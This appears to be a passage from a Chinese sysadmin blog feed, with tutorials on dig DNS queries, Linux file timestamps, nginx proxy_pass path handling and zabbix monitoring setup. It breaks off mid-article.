验证DNS映射不正确的DNS配置会给你带来很多苦恼，你可以通过如下两种方式验证你的DNS配置：1.每个主机名应该被解析到一个IP地址，而且那个IP地址也应该反指向那个主机名。2.如果你子网上一个地址被反指向一个主机名，那么那个主机名也必须指向这个IP。对于这两条规则来说，还有一些例外情况，比如CNAME应该首先解析到另外一个主机名，而且只能指向一个IP，有时多个主机名指向了相同的IP地址，但是那个IP只能有一个PTR记录。综上，这些有助于你检查你的DNS映射是否像你想象的那样工作。你也可以编写一个测试脚本写入你已知的主机名，如下所示，内容很简单；它执行时当捕捉到一个CNAME时它就会中断，如果多个主机名指向同一个IP地址它会报错。我们假设这个文件包含你的主机名叫做named-hosts。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/bash## test DNS forward- and reverse-mapping## edit this variable to reflect local class C subnet(s)NETS="192.168.1 192.168.2"# Test name to address to name validityechoecho -e "\tname -&gt; address -&gt; name"echo '----------------------------------'while read H; do ADDR=$(dig $H +short) if test -n "$ADDR"; then HOST=$(dig -x $ADDR +short) if test "$H" = "$HOST"; then echo -e "ok\t$H -&gt; $ADDR -&gt; $HOST" elif test -n "$HOST"; then echo -e "fail\t$H -&gt; $ADDR -&gt; $HOST" else echo -e "fail\t$H -&gt; $ADDR -&gt; [unassigned]" fi else echo -e "fail\t$H -&gt; [unassigned]" fidone &lt; named-hosts# Test address to name to address validityechoecho -e "\taddress -&gt; name -&gt; address"echo '-------------------------------------'for NET in $NETS; do for n in $(seq 1 254); do A=$&#123;NET&#125;.$&#123;n&#125; HOST=$(dig -x $A +short) if test -n "$HOST"; then ADDR=$(dig $HOST +short) if test "$A" = "$ADDR"; then echo -e "ok\t$A -&gt; $HOST -&gt; $ADDR" elif test -n "$ADDR"; then echo -e "fail\t$A -&gt; $HOST -&gt; $ADDR" else echo -e "fail\t$A -&gt; $HOST -&gt; [unassigned]" fi fi donedone 有趣的dig创建属于你自己的named.root文件任何连接到internet 的DNS服务器肯定会有InterNIC的named.root文件的拷贝，文件列出所有internet的根DNS，如果你不怕麻烦的话，你可以经常从InterNIC的ftp服务器上把它下载下来，或者，你可以使用dig命令创建属于你自己的时髦的named.root 12# compare with [ftp://ftp.internic.net/domain/named.root]()dig +nocmd . NS +noall +answer +additional 你的TTL值在这边可能会很小，但是它是你找到最新的named.root文件！ 跟踪dig的查询路径你可能是个traceroute的狂热爱好者，经常喜欢查看如何从点A连接点B。那你可以使用dig +trace选项做类似的事。 1dig gentoo.de +trace 你可以在dig输出的头部分看到根DNS，然后找到负责解析所有*.de的DNS，最后找到gentoo.de的域名IP。 获取SOA记录作为一个DNS管理员，我有时会（对DNS配置）做一些改变，并且想知道我的DNS解析是否推送的还是旧数据，这个+nssearch选项可以给你的公众服务器提供清楚的统计信息。 12345# the unvarnished truthdig cse.ogi.edu +nssearch# the same, displaying only serial number and hostnamedig cse.ogi.edu +nssearch | cut -d' ' -f4,11 解释TTL数值我喜爱google有很多原因，其中一个原因就是它在我的WEB日志中提供了精确的链接，它会使我很容易地指出哪种类型的查询引导人们来访问这个站点的页面。出乎意料的是，我已经看到很多请求要求查询TTL数值，我从来没想到TTL会成为最受欢迎的东东，但是你每天都在学习新东西，所以，应大家的要求，这里稍微介绍一下TTL。如果你从本地DNS查询互联网地址，服务器指出从哪里获得权威的答案并获得地址，一旦服务器获知答案，它将这个答案保存在本地缓存中以免你在稍后的时间内再次查询同样的地址，这样它就会很快地从缓存中获取你要的答案，比你再次从internet查询要快很多。当域管理员配置DNS记录时，他们可以决定这个记录可以在缓存中保存多长时间，这就是TTL数值（通常用多少秒来表示）。通常地，远端服务器一般对记录的缓存只保存TTL数值长的时间。时间过期后，服务器会刷新它的本地缓存并重新查询一个权威答案。当你用dig来查询DNS服务器某条记录时，服务器会告诉dig这条记录可以在缓存中保持的时间长短。举个例子，像上面写的那样，gmail.com域的MX记录的TTL值是300s，gmail.com域的管理员要求远端服务器缓存它的MX记录不能高于5分钟，所以当你第一次查询那个记录（gmail.com的MX记录）时，dig会告诉你一个300的TTL。 1234567891011$ dig +nocmd gmail.com MX +noall +answergmail.com. 300 IN MX 20 gsmtp57.google.com.gmail.com. 300 IN MX 10 gsmtp171.google.com.如果你一段时间后再去查，你会发现TTL值减少为280（中间隔了20s）。$ dig +nocmd gmail.com MX +noall +answergmail.com. 280 IN MX 10 gsmtp171.google.com.gmail.com. 280 IN MX 20 gsmtp57.google.com.如果你的时间计算得足够好，你会获取这条记录的最后生存时间。$ dig +nocmd gmail.com MX +noall +answergmail.com. 1 IN MX 10 gsmtp171.google.com.gmail.com. 1 IN MX 20 gsmtp57.google.com. 在那之后，你查询的DNS服务器会“忘记”这个问题的答案，在你下次查询这条记录时，整个循环又将开始（本例子中是300s）。 建议在 unix 和 linux 下，建议大家使用 dig 命令来代替 nslookup。 dig 命令的功能比 nslookup 强大很多，不像 nslookkup 还得 set 来 set 去的，怪麻烦的。 用法下面是 dig 的一些比较常用的命令: dig 最基本的用法1dig @server qianlong.com 用 dig 查看 zone 数据传输1dig @server qianlong.com AXFR 用 dig 查看 zone 数据的增量传输1dig @server qianlong.com IXFR=N 用 dig 查看反向解析1dig -x 124.42.102.203 @server 查找一个域的授权 dns 服务器1dig qianlong.com +nssearch 从根服务器开始追踪一个域名的解析过程1dig qianlong.com +trace 查看你使用的是哪个 F root dns server1dig +norec @F.ROOT-SERVERS.NET HOSTNAME.BIND CHAOS TXT 查看 bind 的版本号1dig @bind_dns_server CHAOS TXT version.bind 你可以到 www.isc.org 去下载一个 bind for windows 的版本安装，安装后就可以在 windows 上使用 dig 命令了。^O^ 1ftp://ftp.isc.org/isc/bind/contrib/ntbind-9.3.0/BIND9.3.0.zip 语法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677dig [@server] [-b address] [-c class] [-f filename] [-k filename] [ -n ][-p port#] [-t type] [-x addr] [-y name:key] [name] [type] [class] [queryopt...]dig [-h]dig [global-queryopt...] [query...]描述dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。虽然通常情况下 dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。不同于早期版本，dig 的 BIND9 实现允许从命令行发出多个查询。除非被告知请求特定域名服务器，dig 将尝试 /etc/resolv.conf 中列举的所有服务器。当未指定任何命令行参数或选项时，dig 将对“.”（根）执行 NS 查询。标志-b address 设置所要询问地址的源 IP 地址。这必须是主机网络接口上的某一合法的地址。-c class 缺省查询类（IN for internet）由选项 -c 重设。class 可以是任何合法类，比如查询 Hesiod 记录的 HS 类或查询 CHAOSNET 记录的 CH 类。-f filename 使 dig 在批处理模式下运行，通过从文件 filename 读取一系列搜索请求加以处理。文件包含许多查询；每行一个。文件中的每一项都应该以和使用命令行接口对 dig 的查询相同的方法来组织。-h 当使用选项 -h 时，显示一个简短的命令行参数和选项摘要。-k filename 要签署由 dig 发送的 DNS 查询以及对它们使用事务签名（TSIG）的响应，用选项 -k 指定 TSIG 密钥文件。-n 缺省情况下，使用 IP6.ARPA 域和 RFC2874 定义的二进制标号搜索 IPv6 地址。为了使用更早的、使用 IP6.INT 域和 nibble 标签的 RFC1886 方法，指定选项 -n（nibble）。-p port# 如果需要查询一个非标准的端口号，则使用选项 -p。port# 是 dig 将发送其查询的端口号，而不是标准的 DNS 端口号 53。该选项可用于测试已在非标准端口号上配置成侦听查询的域名服务器。-t type 设置查询类型为 type。可以是 BIND9 支持的任意有效查询类型。缺省查询类型是 A，除非提供 -x 选项来指示一个逆向查询。通过指定 AXFR 的 type 可以请求一个区域传输。当需要增量区域传输（IXFR）时，type 设置为 ixfr=N。增量区域传输将包含自从区域的 SOA 记录中的序列号改为 N 之后对区域所做的更改。-x addr 逆向查询（将地址映射到名称）可以通过 -x 选项加以简化。addr 是一个以小数点为界的 IPv4 地址或冒号为界的 IPv6 地址。当使用这个选项时，无需提供 name、class 和 type 参数。dig 自动运行类似 11.12.13.10.in-addr.arpa 的域名查询，并分别设置查询类型和类为 PTR 和 IN。-y name:key 您可以通过命令行上的 -y 选项指定 TSIG 密钥；name 是 TSIG 密码的名称，key 是实际的密码。密码是 64 位加密字符串，通常由 dnssec-keygen（8）生成。当在多用户系统上使用选项 -y 时应该谨慎，因为密码在 ps（1）的输出或 shell 的历史文件中可能是可见的。当同时使用 dig 和 TSCG 认证时，被查询的名称服务器需要知道密码和解码规则。在 BIND 中，通过提供正确的密码和 named.conf 中的服务器声明实现。参数global-queryopt... 全局查询选项（请参阅多个查询）。查询 查询选项（请参阅查询选项）。查询选项dig 提供查询选项号，它影响搜索方式和结果显示。一些在查询请求报头设置或复位标志位，一部分决定显示哪些回复信息，其它的确定超时和重试战略。每个查询选项被带前缀（+）的关键字标识。一些关键字设置或复位一个选项。通常前缀是求反关键字含义的字符串 no。其他关键字分配各选项的值，比如超时时间间隔。它们的格式形如 +keyword=value。查询选项是：+[no]tcp查询域名服务器时使用 [不使用] TCP。缺省行为是使用 UDP，除非是 AXFR 或 IXFR 请求，才使用 TCP 连接。+[no]vc查询名称服务器时使用 [不使用] TCP。+[no]tcp 的备用语法提供了向下兼容。 vc 代表虚电路。+[no]ignore忽略 UDP 响应的中断，而不是用 TCP 重试。缺省情况运行 TCP 重试。+domain=somename设定包含单个域 somename 的搜索列表，好像被 /etc/resolv.conf 中的域伪指令指定，并且启用搜索列表处理，好像给定了 +search 选项。+[no]search使用 [不使用] 搜索列表或 resolv.conf 中的域伪指令（如果有的话）定义的搜索列表。缺省情况不使用搜索列表。+[no]defname不建议看作 +[no]search 的同义词。+[no]aaonly该选项不做任何事。它用来提供对设置成未实现解析器标志的 dig 的旧版本的兼容性。+[no]adflag在查询中设置 [不设置] AD（真实数据）位。目前 AD 位只在响应中有标准含义，而查询中没有，但是出于完整性考虑在查询中这种性能可以设置。+[no]cdflag在查询中设置 [不设置] CD（检查禁用）位。它请求服务器不运行响应信息的 DNSSEC 合法性。+[no]recursive切换查询中的 RD（要求递归）位设置。在缺省情况下设置该位，也就是说 dig 正常情形下发送递归查询。当使用查询选项 +nssearch 或 +trace 时，递归自动禁用。+[no]nssearch这个选项被设置时，dig 试图寻找包含待搜名称的网段的权威域名服务器，并显示网段中每台域名服务器的 SOA 记录。+[no]trace切换为待查询名称从根名称服务器开始的代理路径跟踪。缺省情况不使用跟踪。一旦启用跟踪，dig 使用迭代查询解析待查询名称。它将按照从根服务器的参照，显示来自每台使用解析查询的服务器的应答。+[no]cmd设定在输出中显示指出 dig 版本及其所用的查询选项的初始注释。缺省情况下显示注释。+[no]short提供简要答复。缺省值是以冗长格式显示答复信息。+[no]identify当启用 +short 选项时，显示 [或不显示] 提供应答的 IP 地址和端口号。如果请求简短格式应答，缺省情况不显示提供应答的服务器的源地址和端口号。+[no]comments切换输出中的注释行显示。缺省值是显示注释。+[no]stats该查询选项设定显示统计信息：查询进行时，应答的大小等等。缺省显示查询统计信息。+[no]qr显示 [不显示] 发送的查询请求。缺省不显示。+[no]question当返回应答时，显示 [不显示] 查询请求的问题部分。缺省作为注释显示问题部分。+[no]answer显示 [不显示] 应答的回答部分。缺省显示。+[no]authority显示 [不显示] 应答的权限部分。缺省显示。+[no]additional显示 [不显示] 应答的附加部分。缺省显示。+[no]all设置或清除所有显示标志。+time=T为查询设置超时时间为 T 秒。缺省是5秒。如果将 T 设置为小于1的数，则以1秒作为查询超时时间。+tries=A设置向服务器发送 UDP 查询请求的重试次数为 A，代替缺省的 3 次。如果把 A 小于或等于 0，则采用 1 为重试次数。+ndots=D出于完全考虑，设置必须出现在名称 D 的点数。缺省值是使用在 /etc/resolv.conf 中的 ndots 语句定义的，或者是 1，如果没有 ndots 语句的话。带更少点数的名称被解释为相对名称，并通过搜索列表中的域或文件 /etc/resolv.conf 中的域伪指令进行搜索。+bufsize=B设置使用 EDNS0 的 UDP 消息缓冲区大小为 B 字节。缓冲区的最大值和最小值分别为 65535 和 0。超出这个范围的值自动舍入到最近的有效值。+[no]multiline以详细的多行格式显示类似 SOA 的记录，并附带可读注释。缺省值是每单个行上显示一条记录，以便于计算机解析 dig 的输出。 多条查询dig 的 BIND9 支持在命令行上指定多个查询（支持 -f 批处理文件选项的附加功能）。每条查询可以使用自己的标志位、选项和查询选项。在这种情况下，在上面描述的命令行语法中，每条查询自变量代表一个个别查询。每一条由任意标准选项和标志、待查询名称、可选查询类型和类以及任何适用于该查询的查询选项。也可以使用对所有查询均有效的查询选项全局集合。全局查询选项必须位于命令行上第一个名称、类、类型、选项、标志和查询选项的元组之前。任何全局查询选项（除了 +[no]cmd 选项）可以被下面的查询特别选项重设。例如: 1dig +qr www.isc.org any -x 127.0.0.1 isc.org ns +noqr显示 dig 如何从命令行出发进行三个查询：一个针对 www.isc.org的任意查询、一个 127.0.0.1 的逆向查询，以及一个 isc.org 的 NS 记录查询。应用了 +qr 的全局查询选项，以便 dig 显示进行每条查询的初始查询。最后那个查询有一个本地查询选项 +noqr，表示 dig 在搜索 isc.org 的 NS 记录时不显示初始查询。 示例一个典型的 dig 调用类似：dig @server name type其中：server待查询名称服务器的名称或 IP 地址。可以是用点分隔的 IPv4 地址或用冒号分隔的 IPv6 地址。当由主机提供服务器参数时，dig 在查询域名服务器前先解析那个名称。如果没有服务器参数可以提供，dig 参考 /etc/resolv.conf，然后查询列举在那里的域名服务器。显示来自域名服务器的应答。name将要查询的资源记录的名称。type显示所需的查询类型 － ANY、A、MX、SIG，以及任何有效查询类型等。如果不提供任何类型参数，dig 将对纪录 A 执行查询。]]></content>
      <categories>
        <category>系统运维</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解linux中文件的三种time]]></title>
    <url>%2Farticles%2F3b236ad9.html</url>
    <content type="text"><![CDATA[目的linux下文件有3个时间的，分别是atime,mtime,ctime。有些博友对这3个时间还是比较迷茫和困惑的，我整理了下，写下来希望对博友们有所帮助。 含义 简名 全名 中文名 含义 atime access time 访问时间 文件中的数据库最后被访问的时间 mtime modify time 修改时间 文件内容被修改的最后时间 ctime change time 变化时间 文件的元数据发生变化。比如权限，所有者等 查看12345678910111213141516171819202122232425262728[root@centos7 time]# pwd/app/time[root@centos7 time]# lltotal 8-rw-------. 1 root root 1933 Nov 11 08:14 anaconda-ks.cfg-rw-r--r--. 1 root root 59 Nov 11 08:15 issue[root@centos7 time]# stat issue File: ‘issue’ Size: 59 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 08:15:05.650986739 +0800Modify: 2017-11-11 08:15:05.650986739 +0800Change: 2017-11-11 08:15:05.650986739 +0800 Birth: -[root@centos7 time]# ls -l #默认的ls -l显示的是mtime total 8-rw-------. 1 root root 1933 Nov 11 08:14 anaconda-ks.cfg-rw-r--r--. 1 zhaojiedi root 71 Nov 11 09:05 issue[root@centos7 time]# ls -l --time=atime #列出文件的atimetotal 8-rw-------. 1 root root 1933 Nov 11 08:14 anaconda-ks.cfg-rw-r--r--. 1 zhaojiedi root 71 Nov 11 09:12 issue[root@centos7 time]# ls -l --time=ctime #列出ctimetotal 8-rw-------. 1 root root 1933 Nov 11 08:14 anaconda-ks.cfg-rw-r--r--. 1 zhaojiedi root 71 Nov 11 09:03 issue 测试3.1 准备工作测试前，我们需要先关闭文件系统的relatime特性。这个随后在说，具体操作如下。 123[root@centos7 time]# mount -o remount,strictatime /app # 重新挂载我们的/app，并修改文件系统工作在严格atime上，也就是不启用了默认的relatime支持。[root@centos7 time]# mount |grep /app #查看我们的修改/dev/sda5 on /app type ext4 (rw,seclabel,data=ordered) 3.2 读取文件1234567891011121314151617181920212223242526[root@centos7 time]# stat issue #先获取3个时间 File: ‘issue’ Size: 59 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 08:15:05.650986739 +0800Modify: 2017-11-11 08:15:05.650986739 +0800Change: 2017-11-11 08:15:05.650986739 +0800 Birth: -[root@centos7 time]# cat issue #读取下\SKernel \r on an \mtty: \lhostname: \ntime: \t[root@centos7 time]# stat issue #再次查看3个时间 File: ‘issue’ Size: 59 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 08:57:40.858948780 +0800Modify: 2017-11-11 08:15:05.650986739 +0800Change: 2017-11-11 08:15:05.650986739 +0800 Birth: - 通过上面的分析，我们可以看出来，在使用cat读取文件后，文件的atime发生了改变。其他的没有改变。 3.3 修改文件123456789101112131415161718192021[root@centos7 time]# stat issue #先获取下3个time File: ‘issue’ Size: 65 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 09:03:49.080931626 +0800Modify: 2017-11-11 09:04:16.881930331 +0800Change: 2017-11-11 09:04:16.881930331 +0800 Birth: -[root@centos7 time]# echo &quot;hello&quot; &gt;&gt; issue #修改文件[root@centos7 time]# stat issue #再次查看三个time File: ‘issue’ Size: 71 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 09:03:49.080931626 +0800Modify: 2017-11-11 09:05:07.775927960 +0800Change: 2017-11-11 09:05:07.775927960 +0800 Birth: - 通过上面的实验，我们可以看出来，写文件操作不会导致atime(访问时间）的修改，但是mtime和ctime会发生修改。mtime修改了我们可以理解的，毕竟我们修改了文件的， 那为何ctime也修改了呢， 仔细可以发现我们文件的大小发生了变化，也就是元数据发生了变化，所以ctime也是要变化的。 3.4 修改文件所有者123456789101112131415161718192021[root@centos7 time]# stat issue #先查看下3个time File: ‘issue’ Size: 71 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 09:03:49.080931626 +0800Modify: 2017-11-11 09:05:07.775927960 +0800Change: 2017-11-11 09:05:07.775927960 +0800 Birth: -[root@centos7 time]# chown zhaojiedi issue #修改权限[root@centos7 time]# stat issue #再次查看3个时间 File: ‘issue’ Size: 71 Blocks: 8 IO Block: 4096 regular fileDevice: 805h/2053d Inode: 261123 Links: 1Access: (0644/-rw-r--r--) Uid: ( 1000/zhaojiedi) Gid: ( 0/ root)Context: unconfined_u:object_r:etc_runtime_t:s0Access: 2017-11-11 09:03:49.080931626 +0800Modify: 2017-11-11 09:05:07.775927960 +0800Change: 2017-11-11 09:12:42.076906795 +0800 Birth: - 通过上面的实验，我们可以看出来，修改了权限后，文件ctime发生了变化。 说说relatime常用命令对三个time的修改情况我们上面的测试，可以看出来，每次访问文件都会更新atime,这是很耗时的，尤其在web服务器上，大量用户只是访问html页面，完全没有必要修改atime。 从kernel2.6.29开始，文件系统默认集成了一个relatime的属性。 那么啥时候更新atime呢？ 有2种情况会更新atime,第一种是mtime比atime新，第二种是上次访问是1天前的了。 常用命令对三个time的修改情况上面我们做了3个测试，我们也对atime,mtime,ctime有了一定的了解。网上有人已经做了好多测试如下表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687+-------------------------------------------------+ | | timestamps marked for update | | syscall |---------------------------------| | | file | parent dir | |---------------+-------------------+-------------| | [2]chdir | | | |---------------| - | - | | [3]fchdir | | | |---------------+-------------------+-------------| | [4]chmod | | | |---------------| ctime | - | | [5]fchmod | | | |---------------+-------------------+-------------| | [6]chown | | | |---------------| | | | [7]fchown | ctime | - | |---------------| | | | [8]lchown | | | |---------------+-------------------+-------------| | [9]close | - | - | |---------------+-------------------+-------------| | [10]creat | atime,ctime,mtime | ctime,mtime | |---------------+-------------------+-------------| | [11]execve | atime | - | |---------------+-------------------+-------------| | [12]fcntl | - | - | |---------------+-------------------+-------------| | [13]ftruncate | | | |---------------| ctime,mtime | - | | [14]truncate | | | |---------------+-------------------+-------------| | [15]fstat | | | |---------------| | | | [16]stat | - | - | |---------------| | | | [17]lstat | | | |---------------+-------------------+-------------| | [18]fsync | | | |---------------| - | - | | [19]fdatasync | | | |---------------+-------------------+-------------| | [20]link | ctime | ctime,mtime | |---------------+-------------------+-------------| | [21]lseek | - | - | |---------------+-------------------+-------------| | [22]mknod | atime,ctime,mtime | ctime,mtime | |---------------+-------------------+-------------| | [23]mkdir | atime,ctime,mtime | ctime,mtime | |---------------+-------------------+-------------| | [24]mmap | * | - | |---------------+-------------------+-------------| | [25]munmap | - | - | |---------------+-------------------+-------------| | [26]msync | * | - | |---------------+-------------------+-------------| | [27]open | * | * | |---------------+-------------------+-------------| | [28]pread | | | |---------------| | | | [29]read | atime | - | |---------------| | | | [30]readv | | | |---------------+-------------------+-------------| | [31]pwrite | | | |---------------| | | | [32]write | ctime,mtime | - | |---------------| | | | [33]writev | | | |---------------+-------------------+-------------| | [34]rename | implementation | ctime,mtime | |---------------+-------------------+-------------| | [35]rmdir | - | ctime,mtime | |---------------+-------------------+-------------| | [36]readlink | * | - | |---------------+-------------------+-------------| | [37]readdir | atime | - | |---------------+-------------------+-------------| | readahead | ? | ? | |---------------+-------------------+-------------| | [38]symlink | * | * | |---------------+-------------------+-------------| | sendfile | ? | ? | |---------------+-------------------+-------------| | [39]unlink | - | ctime,mtime | |---------------+-------------------+-------------| | [40]utime | ctime | - | +-------------------------------------------------+]]></content>
      <categories>
        <category>系统运维</category>
        <category>系统详解</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[proxy_pass后加不加斜杠的区别]]></title>
    <url>%2Farticles%2F98a39ceb.html</url>
    <content type="text"><![CDATA[背景在nginx中配置proxy_pass时，当在后面的url上加不加/，区别是如此的大呢。 如加上了/，相当于是绝对根路径，则nginx不会把location中匹配的路径部分代理走; 如果没有加/，则会把匹配的路径部分也给代理走。 Location的目录匹配详解12345没有“/”时，可以模糊匹配字符串本身和后面所有例如：location /abc/def可以匹配/abc/defghi请求，也可以匹配/abc/def/ghi等而有“/”时，只能匹配后面例如：location /abc/def/不能匹配/abc/defghi请求，只能匹配/abc/def/anything这样的请求 Proxy_pass后url区别详解下面四种情况分别用http://192.168.1.4/proxy/test.html 进行访问。 第一种：加/123location /proxy/ &#123; proxy_pass http://127.0.0.1:81/;&#125; 结论：会被代理到http://127.0.0.1:81/test.html 这个url 第二种: 不加/123location /proxy/ &#123; proxy_pass http://127.0.0.1:81;&#125; 结论：会被代理到http://127.0.0.1:81/proxy/test.html 这个url 第三种: 加目录加/：123location /proxy/ &#123; proxy_pass http://127.0.0.1:81/ftlynx/;&#125; 结论：会被代理到http://127.0.0.1:81/ftlynx/test.html 这个url。 第四种：加目录不加/：123location /proxy/ &#123; proxy_pass http://127.0.0.1:81/ftlynx;&#125; 结论：会被代理到http://127.0.0.1:81/ftlynxtest.html 这个url 总结location目录字符串后加/，就只能匹配后面，不加不仅可以匹配后面还可字符串模糊匹配。 proxy_pass加/, 代理地址就不加location匹配目录; 不加/，代理直接就加目录。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务优化</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解zabbix的监控方式]]></title>
    <url>%2Farticles%2F99653f69.html</url>
    <content type="text"><![CDATA[介绍zabbix支持的主要监控方式： ​ zabbix主要Agent，Trapper，SNMP，JMX，IPMI这几种监控方式，本文章主要通过监控理论和实际操作测试等方式来简单介绍这几种方式的监控原理和优缺点等 。下面对几种监控方式的监控原理进行介绍： 优缺点Agent监控方式​ 在Agent监控方式下，zabbix-agent会主动收集本机的监控信息并通过TCP协议与zabbix-server传递信息。Agent监控方式分为主动和被动模式。在被动模式下，zabbix-agent监听10050端口，等待zabbix-server的监控信息收集信息请求；在主动模式下，zabbix-agent收集监控信息并通过10050端口主动将数据传给zabbix-server所在服务器的10051端口。 ​ 优点： ​ （1）是zabbix最常用的监控方式，监测指标深入细致有针对性。 ​ （2）内置监控功能强大，内置监控项目丰富。 ​ （3）TCP方式实现通讯，可靠性也有保证。 ​ 缺点： ​ （1）需要在被监控机器上安装zabbix-agent客户端，部署相对麻烦，最初需要逐个机器安装代理软件 ​ （2）zabbix-agent客户端运行在被监控机上，会收集本机信息 Trapper监控方式​ Trapper监控方式使用zabbix-sender程序主动向zabbix-server发送数据。key的名称和发送的数据内容都可以灵活定义。发送的信息采用JSON格式，遵循zabbix-sender协议。可以自定义脚本利用zabbix-sender协议来zabbix-server发送信息。 ​ 优点： ​ （1）不需要在被监控机器上安装zabbix-agent ​ （2）不收集被监控机器的信息 ​ （3）可以自定义发送的信息内容 ​ （4）可以使用自定义脚本发送信息 ​ 缺点： ​ （1）需要自定义发送的信息内容 ​ （2）无内置监控项目 SNMP监控方式​ SNMP全称Simple Network Management Protocol，即网络管理协议，包括进程管理和被管理设备两部分。作为一种国际通用的网络管理协议被广泛的应用于各种交换机，路由器等网络设备的管理上，而现在也越来越多被用于对服务器的监控上。 ​ 优点： ​ （1）服务器一旦部署SNMPAgent，任何能实现SNMP协议的软件都可以对其进行监测。 ​ （2）通过这种手段进行监测不需知道被监测服务器的用户名和密码，比较安全。 ​ 缺点： ​ （1）很多服务器并非默认安装SNMPAgent，如果通过这种方式监测则需要对所有服务器安装部署。 ​ （2）能监测的参数指标比较固定不够深入，无法满足用户的特殊需求。 ​ （3）由于SNMP协议是通过UDP方式实现的。在网络状况不佳的情况下其可靠性能以保证。 JMX监控方式​ JMX，全称Java Management Extensions，即Java管理拓展，是Java平台为应用程序，设备，系统等植入管理功能的框架。在zabbix中，JMX数据的获取由zabbix-java-gateway代理程序来负责数据的采集。 ​ 优点： ​ （1）可以详细的监控各类Java程序的运行状态 ​ 缺点： ​ （1）被监控机上需要安装zabbix-java-gateway IPMI监控方式​ IPMI，全称Interlligent Platform Management Interface，即智能平台管理接口，原本是Intel架构中企业系统的周边设备所采用的一种工业标准，以后成为业界通用的标准。用户可以利用IPMI监控服务器的物理特性，如温度，电压，电扇工作状态，电源供应以及机箱***等指标。 ​ 根据以上对zabbix各主要监控方式的梳理，结论如下： ​ （1）根据被监控机器的环境和客户要求选用适当的监控方式，可同时配合多种监控方式。 ​ （2）有条件在监控机上部署zabbix-agent客户端时，该方法为第一选择，因为其功能强大且配置相对简便。 ​ （3）需要自定义脚本或者监控信息时，可使用Trapper方式，即使用zabbix-sender程序或者自定义脚本遵循zabbix-sender协议，已JSON形式，通过TCP发送自定义信息。 方式的实现Agent监控方式1、通过Agent方式监控Linux服务器​ （1）需要在Linux服务器上安装zabbix-agent客户端安装包，需要先导入软件安装源: 1rpm -ivh http://repo.zabbix.com/zabbix/3.5/rhel/7/x86_64/zabbix-release-3.5-1.el7.noarch.rpm ​ （2） 使用yum源安装zabbix-agent 1yum install zabbix-agent ​ （3）zabbix客户端配置 ​ 编辑zabbix_server配置文件并启动 12345678910111213vim /etc/zabbix/zabbix_agent.conf#修改以下配置信息：Server=192.168.40.134 #zabbix服务端IP地址ServerActive=192.168.40.134 #zabbix服务端IP地址ListenPort=10050 #监控服务端口#启动zabbix-agent服务systemctl start zabbix-agent ​ （4）zabbix服务器端添加被监控主机 ​ 选择“配置”-“主机”，然后选择“创建主机”: ​ 选择添加的模板： ​ 添加主机成功： 2、通过Agent方式监控windows服务器​ （1）下载Windows的zabbix客户端 ​ 下载地址：Zabbix官网 ​ 选择需要下载的windows版本客户端： （2）确定被监控主机的系统是32位还是64位 ​ 右键“此电脑”，查看操作系统版本. ​ （3）windows上安装agent ​ 根据系统信息直接选择msi或zip压缩包，在此需要注意和server端一致。然后解压安装即可. （4）修改配置文件 ​ 需要修改的内容为：LogFile、Server、Hostname、ServerActive这几个参数。具体配置如下： 1234Server=192.168.40.134ServerActive=192.168.40.134Hostname=Windows host ListenPort=10050 （5）安装zabbix-agent客户端程序 ​ 用管理员权限打开CMD，进入到zabbix的应用程序目录，执行安装命令： 1zabbix_agentd.exe -c D:\zabbix-agent\conf\zabbix_agentd.win.conf -i ​ 安装成功后，执行运行命令： 1zabbix_agentd.exe -c D:\zabbix-agent\conf\zabbix_agentd.win.conf -s ​ （6）在zabbix server端配置agent ​ 在server端，选择 配置-主机 界面，然后点击“创建主机”，在添加主机的界面，输入被监控主机客户端的信息。 ​ 点击“添加”，然后过一段时间查看主机状态 ​ zabbix Trapper监控方式1、zabbix Trapper 工作原理​ zabbix获取数据时有时会出现超时，如果一些数据需要执行较长的时间才能获取的话，那么zabbix会出现异常，考虑到这种情况，zabbix增加了Trapper功能，客户端自己提交数据给zabbix。 ​ Trapper是被监控主机主动发送数据给zabbix server，与主动模式的区别是不需要安装客户端；Trapper方式发送数据是以主机名处理，不是IP地址，所以主机名要唯一。在配置监控项时候Type of information项要选择text，否则会报not support错误。 ​ Trapper工作模式中，使用zabbix监控类型zabbix 